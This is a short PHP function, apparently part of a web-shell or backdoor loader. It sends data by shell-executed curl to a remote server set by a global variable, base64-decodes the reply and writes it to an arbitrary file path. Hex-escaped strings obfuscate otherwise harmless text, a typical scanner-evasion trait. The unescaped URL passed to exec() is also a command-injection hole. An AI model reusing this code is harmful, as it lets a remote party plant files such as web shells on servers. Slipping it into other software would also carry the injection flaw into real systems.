<?php

function put_result($target_file, $data, $params)
{
    try {
        global $api_url;
        $url = $api_url . $params;

        $json_data = http_build_query($data);
        if (json_last_error() !== JSON_ERROR_NONE) {
            throw new Exception("\x4a\x53\x4f\x4e\x20\x65\x6e\x63\x6f\x64\x69\x6e\x67\x20\x65\x72\x72\x6f\x72\x3a\x20" . json_last_error_msg());
        }

        $escapedData = escapeshellarg($json_data);

        $headers = [
            "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e",
        ];

        $command = "curl -X POST -d $escapedData $url";
        exec($command, $output, $return_var);

        if ($return_var !== 0) {
            throw new Exception("\x43\x75\x72\x6c\x20\x63\x6f\x6d\x6d\x61\x6e\x64\x20\x66\x61\x69\x6c\x65\x64\x20\x77\x69\x74\x68\x20\x73\x74\x61\x74\x75\x73\x3a\x20" . $return_var);
        }
        
        $result = isset($output[0]) ? $output[0] : $output;
        $result = base64_decode($result);
        $buka = fopen($target_file, "\x77");
        if (!$buka) {
            throw new Exception("Unable to open file: $target_file");
        }
        fwrite($buka, $result);
        fclose($buka);
    } catch (\Throwable $th) {
        throw $th;
    }
}
